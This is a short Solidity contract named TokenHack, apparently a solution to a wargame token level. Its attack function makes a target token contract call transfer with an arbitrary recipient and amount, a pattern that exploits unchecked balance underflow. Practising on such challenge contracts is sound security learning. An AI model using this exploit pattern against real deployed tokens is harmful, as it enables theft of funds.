// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "hardhat/console.sol";

interface Token {
    function transfer(address _to, uint _value) external returns (bool);
}

contract TokenHack {

    Token token;

    constructor (address _tokenAddress) public {
        token = Token(_tokenAddress);
    }

    function attack(address _to, uint256 _value) public {
        token.transfer(_to, _value);
    }
  
}